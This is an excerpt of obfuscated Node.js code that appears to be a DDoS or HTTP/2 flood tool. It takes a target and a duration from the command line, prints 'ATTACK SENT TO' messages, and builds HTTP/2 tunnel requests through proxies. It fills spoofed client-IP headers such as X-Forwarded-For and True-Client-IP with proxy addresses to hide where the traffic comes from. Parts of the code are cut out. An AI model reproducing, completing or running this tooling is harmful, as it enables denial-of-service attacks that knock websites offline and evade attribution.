...
const fs = require('fs'), url = require('url'), http = require('http'), tls = require('tls'), net = require('net');
const crypto = require('crypto'), http2 = require('http2'), axios = require('axios'), cluster = require('cluster');
const fakeua = require('fake-useragent'), randstr = require('randomstring');
var request = require('request');
opts = { url: 'https://pornhub.com/' };
request.get(opts, function (_0xf96560, _0x1d504f, _0x1a02b9) {
    if (_0x1a02b9.includes(process.argv[4]) && process.argv[4].length > 14) {
        console.clear();
        console.log('\n=ATTACK SENT TO: ' + process.argv[2] + ' DURATION: ' + process.argv[3] + '\=n');
    } else {
        console.clear();
        console.log('\n=ATTACK SENT TO: ' + process.argv[2] + ' DURATION: ' + process.argv[3] + '\=n');
    }
...
class TlsBuilder2 {
    ...
    ['http2TUNNEL'](_0x35df3e) {
        ...
        if (getRandomInt(1, 5) == 3) {
            var _0x6f5cde = 0;
            payload.Via = '' + proxy + '';
            payload['Client-IP'] = '' + proxy + '';
            payload['X-Forwarded-For'] = '' + proxy + '';
            payload['Real-IP'] = '' + proxy + '';
            payload['X-Client-IP'] = '' + proxy + '';
            payload['X-Real-IP'] = '' + proxy + '';
            payload['True-Client-IP'] = '' + proxy + '';
            payload['Fastly-Client-IP'] = '' + proxy + '';
        }
        payload['upgrade-insecure-requests'] = 1;
